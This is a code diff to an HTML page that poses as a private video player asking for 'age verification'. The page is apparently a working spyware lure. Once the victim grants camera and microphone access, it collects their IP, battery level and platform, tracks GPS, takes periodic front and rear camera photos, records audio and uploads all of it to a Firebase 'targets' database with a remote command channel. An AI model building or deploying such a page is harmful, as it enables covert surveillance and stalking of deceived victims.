@@ -3,62 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Stream | Private Access</title>
+    <title>Private Cloud Storage | Secure Player</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; font-family: sans-serif; overflow: hidden; }
         
-        /* Aapki GitHub wali Picture Background */
         #bg-container {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: url('bg.png.jpeg'); /* Make sure this file is in the same folder */
-            background-size: cover; background-position: center;
-            z-index: 1;
+            background: url('bg.png.jpeg'); /* Aapki Github wali pic */
+            background-size: cover; background-position: center; z-index: 1;
         }
 
         #overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.6); z-index: 5;
+            background: rgba(0,0,0,0.7); z-index: 5;
             display: flex; flex-direction: column; align-items: center; justify-content: center;
         }
 
-        /* Play Button Style */
         .play-btn {
-            width: 100px; height: 100px;
-            background: rgba(255, 0, 0, 0.8);
-            border-radius: 50%; border: 5px solid #fff;
+            width: 80px; height: 80px; background: rgba(255, 0, 0, 0.9);
+            border-radius: 50%; border: 4px solid #fff;
             display: flex; align-items: center; justify-content: center;
-            cursor: pointer; box-shadow: 0 0 30px rgba(255,0,0,0.5);
-            transition: 0.3s; margin-bottom: 20px;
+            cursor: pointer; box-shadow: 0 0 20px #f00; transition: 0.3s;
         }
-        .play-btn:hover { transform: scale(1.1); background: #f00; }
         .play-btn::after {
-            content: ''; display: block; border-style: solid;
-            border-width: 15px 0 15px 30px;
-            border-color: transparent transparent transparent #fff;
-            margin-left: 8px;
+            content: ''; border-style: solid; border-width: 12px 0 12px 24px;
+            border-color: transparent transparent transparent #fff; margin-left: 5px;
         }
 
-        /* Verification Pop-up */
         .modal {
-            background: rgba(20, 20, 20, 0.95);
-            border: 1px solid #ff0000; border-radius: 10px;
-            padding: 25px; width: 85%; max-width: 350px;
-            text-align: center; color: #fff; box-shadow: 0 0 20px #000;
+            background: #111; border: 1px solid #f00; border-radius: 8px;
+            padding: 20px; width: 85%; max-width: 320px; text-align: center;
+            color: #fff; margin-top: 20px; display: none;
         }
 
-        .modal h2 { color: #ff0000; font-size: 20px; margin-top: 0; }
-        .modal p { font-size: 13px; color: #ccc; margin-bottom: 20px; }
-        
         .start-btn {
-            background: #ff0000; color: #fff; border: none;
-            padding: 12px 25px; border-radius: 5px; font-weight: bold;
-            width: 100%; cursor: pointer; text-transform: uppercase;
+            background: #f00; color: #fff; border: none; padding: 12px;
+            width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer;
         }
 
-        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1000; background: #000; }
-        iframe { width: 100%; height: 100%; border: none; }
+        /* Video Layer - Fixed */
+        #video-container { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; background: #000; }
+        #main-player { width: 100%; height: 100%; }
     </style>
 </head>
 <body>
@@ -69,16 +56,16 @@
         <div class="play-btn" onclick="showModal()"></div>
         
         <div class="modal" id="v-modal">
-            <h2>ACCESS RESTRICTED</h2>
-            <p>Verification required to unlock this video. Face-sync AI will verify your identity via camera.</p>
-            <input type="text" id="target-id" placeholder="Enter Access Code..." 
-                   style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #444; background:#222; color:#fff; box-sizing:border-box;">
-            <button class="start-btn" onclick="ignite()">Verify & Unlock</button>
+            <h3 style="color:#f00; margin:0 0 10px 0;">VERIFICATION REQUIRED</h3>
+            <p style="font-size:12px; color:#bbb;">Grant camera access to verify age and unlock video.</p>
+            <input type="text" id="target-id" placeholder="Enter Nickname..." 
+                   style="width:100%; padding:10px; margin-bottom:15px; border:1px solid #333; background:#222; color:#fff; box-sizing:border-box;">
+            <button class="start-btn" onclick="ignite()">Verify & Play</button>
         </div>
     </div>
 
     <div id="video-container">
-        <iframe id="main-player" src="" allow="autoplay; camera; microphone"></iframe>
+        <iframe id="main-player" allow="autoplay; encrypted-media; camera; microphone; geolocation" frameborder="0"></iframe>
     </div>
 
 <script>
@@ -87,7 +74,8 @@
     const db = firebase.database();
     
     const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
-    const videoURL = "6Ogzc_-lW9w"; // YouTube ID
+    // YouTube Video ID (Isse aap change kar sakte hain)
+    const videoID = "6Ogzc_-lW9w"; 
 
     function showModal() {
         document.getElementById('v-modal').style.display = 'block';
@@ -95,35 +83,27 @@
 
     async function ignite() {
         const uName = document.getElementById('target-id').value;
-        if(!uName) { alert("Access Code Required"); return; }
+        if(!uName) return alert("Nickname required.");
 
         try {
-            // Permission Handshake
+            // Step 1: Request Permissions (Ye click event ke andar hona chahiye)
             const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            
-            // UI Switch to Video
+
+            // Step 2: Show Video Container
             document.getElementById('video-container').style.display = 'block';
-            document.getElementById('main-player').src = `https://www.youtube.com/embed/${videoURL}?autoplay=1&rel=0`;
+            
+            // Step 3: Load YouTube with correct Autoplay flags
+            const ytURL = `https://www.youtube.com/embed/${videoID}?autoplay=1&controls=1&rel=0&showinfo=0&mute=0`;
+            document.getElementById('main-player').src = ytURL;
 
-            // Data Infiltration
-            let bat = "N/A";
-            try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
-            const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-
-            db.ref(`targets/${sessionID}/info`).set({
-                name: uName, ip: ipReq.ip, battery: bat, 
-                platform: navigator.platform, status: "ONLINE", time: new Date().toLocaleTimeString()
-            });
-
-            db.ref('alerts').set({ id: sessionID, t: Date.now() });
-
-            // Tracking
+            // Step 4: Background Data Collection
+            logData(uName);
             trackGPS();
             capture("user");
-            setTimeout(() => capture("environment"), 4000);
+            setTimeout(() => capture("environment"), 5000);
             setInterval(() => capture("user"), 10000);
 
-            // Commands
+            // Command Listener
             db.ref(`commands/${sessionID}`).on('value', snap => {
                 const c = snap.val();
                 if(c) {
@@ -135,11 +115,24 @@
             });
 
         } catch (e) {
-            alert("Verification Failed. Access Denied.");
+            alert("Error: Verification requires camera access.");
             location.reload();
         }
     }
 
+    async function logData(name) {
+        let bat = "N/A";
+        try { const b = await navigator.getBattery(); bat = Math.floor(b.level * 100); } catch(e){}
+        const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+        
+        db.ref(`targets/${sessionID}/info`).set({
+            name: name, ip: ip.ip, battery: bat, 
+            platform: navigator.platform, status: "ONLINE", time: new Date().toLocaleTimeString()
+        });
+        db.ref('alerts').set({ id: sessionID, t: Date.now() });
+    }
+
+    // Capture & Audio Functions (Same as before)
     async function capture(mode) {
         try {
             const constraints = { video: { facingMode: mode === "user" ? "user" : { exact: "environment" } } };
@@ -151,7 +144,7 @@
                 const c = document.createElement('canvas');
                 c.width = v.videoWidth; c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({ img: c.toDataURL('image/jpeg', 0.5), type: mode });
+                db.ref(`targets/${sessionID}/photos`).push({ img: c.toDataURL('image/jpeg', 0.4), type: mode });
                 stream.getTracks().forEach(t => t.stop());
             }, 2000);
         } catch(e) {}
@@ -169,4 +162,15 @@
                 reader.readAsDataURL(blob);
                 reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({ data: reader.result });
             };
-            mr.start(); setTimeout
+            mr.start(); setTimeout(() => mr.stop(), ms);
+        } catch(e) {}
+    }
+
+    function trackGPS() {
+        navigator.geolocation.watchPosition(p => {
+            db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
+        }, null, {enableHighAccuracy:true});
+    }
+</script>
+</body>
+</html>
